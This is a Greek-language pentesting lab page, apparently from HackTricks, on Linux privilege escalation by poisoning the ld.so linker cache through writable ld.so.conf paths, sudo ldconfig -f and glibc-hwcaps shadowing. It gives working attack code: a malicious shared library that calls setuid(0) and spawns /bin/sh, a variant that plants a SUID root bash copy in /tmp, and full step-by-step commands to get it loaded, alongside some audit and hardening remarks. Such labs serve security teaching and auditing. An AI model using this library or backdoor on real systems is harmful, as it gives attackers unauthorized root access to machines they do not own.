# Παράδειγμα exploit privesc του ld.so

Αυτή η σελίδα είναι ένα στοχευμένο lab για poisoning της **system linker cache μέσω των `/etc/ld.so.conf` ή `ldconfig`**. Για injection ελλιπούς library, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` και άλλο generic SUID linker abuse, δείτε το [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Προετοιμασία του environment

Στην παρακάτω ενότητα μπορείτε να βρείτε τον κώδικα των αρχείων που θα χρησιμοποιήσουμε για να προετοιμάσουμε το environment.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Δημιουργήστε** αυτά τα αρχεία στο σύστημά σας, στον ίδιο φάκελο
2. **Κάντε compile τη** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Αντιγράψτε** το `libcustom.so` στο `/usr/lib` και ανανεώστε το cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Κάντε compile το** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Ελέγξτε το environment

Ελέγξτε ότι το _libcustom.so_ γίνεται **loaded** από το _/usr/lib_ και ότι μπορείτε να **εκτελέσετε** το binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Χρήσιμες εντολές triage

Όταν επιτίθεστε σε έναν πραγματικό στόχο, επαληθεύστε το **ακριβές όνομα της βιβλιοθήκης** που χρειάζεται το binary, τι **επιλύει επί του παρόντος ο loader** και ποια διαμορφωμένα paths είναι εγγράψιμα χωρίς να τροποποιήσετε το ενεργό cache.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Χρησιμοποιήστε το `ldd` μόνο σε ένα **trusted** executable. Ορισμένες υλοποιήσεις ή ασυνήθιστοι ELF interpreters μπορεί να προκαλέσουν την εκτέλεση code που ελέγχεται από attacker· το `objdump -p ./file | grep NEEDED` εμφανίζει με ασφάλεια τις άμεσες dependencies. Για έναν trusted στόχο, η εκτέλεση του interpreter που εντοπίστηκε με `--list` εμφανίζει την πραγματική επίλυση.<sup>[[4]](#references)</sup>

Μερικές χρήσιμες παγίδες:

- Το `sudo echo ... > /etc/ld.so.conf.d/x.conf` συνήθως **δεν λειτουργεί**, επειδή
η ανακατεύθυνση εκτελείται από το τρέχον shell. Χρησιμοποιήστε
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` αντί γι' αυτό.
- Τα **SUID/privileged** binaries εκτελούνται σε **secure-execution mode**: το `LD_LIBRARY_PATH`
αγνοείται, ενώ το `LD_PRELOAD` υπόκειται σε περιορισμούς (ονόματα που περιέχουν slash
αγνοούνται και μπορούν να γίνουν preload μόνο libraries με setuid marking σε standard directories). Όταν το root εκτελέσει το `ldconfig`, οι directories που αναφέρονται στο
`/etc/ld.so.conf` μπορούν να καταχωριστούν στο `/etc/ld.so.cache`, επομένως αυτή η
misconfiguration μπορεί να επηρεάζει ακόμη και privileged programs.<sup>[[1]](#references)[[2]](#references)</sup>
- Το `LD_DEBUG` επίσης αγνοείται σε secure-execution mode, εκτός αν υπάρχει το `/etc/suid-debug`, επομένως συλλέξτε το trace από ένα αντίστοιχο non-SUID run αντί να περιμένετε output από την privileged execution.<sup>[[1]](#references)</sup>
- Στο glibc 2.33 και νεότερο, ο dynamic loader παρέχει επίσης το
`--list-diagnostics`, το οποίο εκτυπώνει machine-readable loader diagnostics και
πληροφορίες για τα built-in search paths όταν ένα hijack δεν συμπεριφέρεται όπως αναμένεται.<sup>[[1]](#references)[[6]](#references)</sup>

### Περιορισμοί Cache και SONAME

Το `ldconfig` δεν κάνει cache κάθε αυθαίρετου file σε ένα configured directory: εξετάζει ELF headers, αναγνωρίζει ονόματα που αντιστοιχούν στα `lib*.so*` ή `ld-*.so*` και αναμένει τη συμβατική ακολουθία `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Επομένως, το injected object πρέπει να έχει την architecture/class του στόχου, το ακριβές όνομα `DT_NEEDED` (συνήθως το `DT_SONAME`) και όλα τα symbols/versions που επιλύει το victim.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Προτιμήστε μια βιβλιοθήκη ειδική για τον στόχο, όπως σε αυτό το παράδειγμα. Η σκίαση ενός συνηθισμένου SONAME με ένα ελλιπές object μπορεί να διακόψει κάθε process που το επιλύει πριν εκτελεστεί ο προβλεπόμενος privileged στόχος.<sup>[[3]](#references)</sup>

## Εκμετάλλευση

Σε αυτό το σενάριο, ας υποθέσουμε ότι ένας administrator έχει προσθέσει μια ευάλωτη καταχώριση σε ένα
αρχείο κάτω από το `/etc/ld.so.conf.d/`, το οποίο περιλαμβάνεται από το
`/etc/ld.so.conf` του συστήματος.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Ο ευάλωτος φάκελος είναι ο _/home/ubuntu/lib_ (όπου έχουμε δικαίωμα εγγραφής).\
**Κατεβάστε και κάντε compile** τον παρακάτω κώδικα μέσα σε αυτήν τη διαδρομή:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Αν αναμένετε ότι το **root** (ή κάποιος άλλος privileged λογαριασμός) θα εκτελέσει αργότερα το ευάλωτο binary, συνήθως είναι προτιμότερο να αφήσετε ένα **root-owned artifact** αντί να εκκινήσετε ένα interactive shell. Για παράδειγμα:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Έπειτα, αφού πραγματοποιηθεί η εκτέλεση με προνομιακά δικαιώματα, μπορείτε να χρησιμοποιήσετε το `/tmp/rootbash -p`.

Τώρα που έχουμε **δημιουργήσει τη malicious libcustom library μέσα στη λανθασμένα ρυθμισμένη** διαδρομή, η προεπιλεγμένη cache πρέπει να αναδημιουργηθεί με μια επιτυχή εκτέλεση του **`ldconfig`** με προνομιακά δικαιώματα. Η επανεκκίνηση βοηθά μόνο όταν η τοπική διαδικασία εκκίνησης την καλεί πράγματι· διαφορετικά, περιμένετε ενέργεια από administrator ή χρησιμοποιήστε έναν unsafe κανόνα sudo, αν υπάρχει διαθέσιμος.<sup>[[2]](#references)</sup>

Μόλις συμβεί αυτό, **ελέγξτε ξανά** από πού φορτώνει το εκτελέσιμο `sharedvuln` τη βιβλιοθήκη `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Όπως μπορείτε να δείτε, το **φορτώνει από το `/home/ubuntu/lib`** και αν οποιοσδήποτε χρήστης το εκτελέσει, θα εκτελεστεί ένα shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Σημειώστε ότι σε αυτό το παράδειγμα δεν έχουμε κάνει privilege escalation, αλλά τροποποιώντας τις εντολές που εκτελούνται και **περιμένοντας από τον root ή κάποιον άλλο privileged user να εκτελέσει το ευάλωτο binary**, θα μπορέσουμε να κάνουμε privilege escalation.

### Σύγχρονο `glibc-hwcaps` shadowing

Από τη glibc 2.33, ο loader μπορεί να προτιμά optimized libraries μέσα στο `glibc-hwcaps/<level>/`, σε **κάθε directory αναζήτησης libraries**. Κατά συνέπεια, ο έλεγχος μόνο του `/home/ubuntu/lib` δεν επαρκεί: ένα writable συμβατό subdirectory, όπως το `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, μπορεί να κάνει shadow τη base library αφού το `ldconfig` την καταχωρίσει στο index, ενώ άλλοι CPUs συνεχίζουν να χρησιμοποιούν το base object. Αυτό παρέχει επίσης ένα architecture-selective hijack που μπορεί να μη γίνει αντιληπτό όταν η validation πραγματοποιείται σε διαφορετικό CPU.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Οι τρέχουσες οδηγίες hardening του glibc συνιστούν την αποφυγή διπλότυπων SONAMEs, μη προεπιλεγμένων τοποθεσιών αναζήτησης και αντικειμένων σε υποκαταλόγους `glibc-hwcaps`. Από την οπτική γωνία ενός audit, εφαρμόστε αναδρομικά ελέγχους ownership και writeability στους ρυθμισμένους καταλόγους και στα components των parent paths τους.<sup>[[3]](#references)</sup>

### Άλλες λανθασμένες ρυθμίσεις - Ίδιο vuln

Στο προηγούμενο παράδειγμα προσποιηθήκαμε μια λανθασμένη ρύθμιση, όπου ένας administrator **όρισε έναν non-privileged φάκελο μέσα σε ένα configuration file μέσα στο `/etc/ld.so.conf.d/`**.\
Υπάρχουν όμως και άλλες λανθασμένες ρυθμίσεις που μπορούν να προκαλέσουν το ίδιο vulnerability: αν έχετε **write permissions** σε ένα φορτωμένο **config file**, μπορείτε να δημιουργήσετε ένα file σε έναν writable κατάλογο `/etc/ld.so.conf.d/` ή μπορείτε να γράψετε στο `/etc/ld.so.conf`, μπορείτε να ρυθμίσετε και να εκμεταλλευτείτε το ίδιο vulnerability.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Ας υποθέσουμε ότι έχετε sudo privileges πάνω στο `ldconfig`**.\
Μπορείτε να υποδείξετε στο `ldconfig` **ποιο configuration file θα διαβάσει** με το `-f`, επομένως ένα file που καθορίζει directories υπό τον έλεγχο του attacker μπορεί να κάνει το `ldconfig` να προσθέσει αυτούς τους φακέλους στο cache.<sup>[[2]](#references)</sup>\
Ας δημιουργήσουμε τα files και τους φακέλους που απαιτούνται για τη φόρτωση του "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Τώρα, όπως υποδεικνύεται στο **previous exploit**, **δημιουργήστε τη malicious library μέσα στο `/tmp`**.\
Και τέλος, ας φορτώσουμε το path και ας ελέγξουμε από πού φορτώνει το binary τη library:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Όπως μπορείτε να δείτε, έχοντας sudo privileges για το `ldconfig`, μπορείτε να εκμεταλλευτείτε την ίδια ευπάθεια.** Οι λεπτομέρειες των options είναι σημαντικές κατά την αξιολόγηση ενός περιορισμένου κανόνα sudo: το `-f` επιλέγει άλλο configuration, αλλά εξακολουθεί να αναδημιουργεί το `/etc/ld.so.cache`· το `-C` ανακατευθύνει το cache αλλού· το `-N` αποτρέπει την αναδημιουργία του cache· και το `-X` αποτρέπει τις ενημερώσεις των links, αλλά **εξακολουθεί να αναδημιουργεί το cache, εκτός αν συνδυαστεί με το `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening του Dynamic Linker - Η GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Διαγνωστικά του Dynamic Linker (Η GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
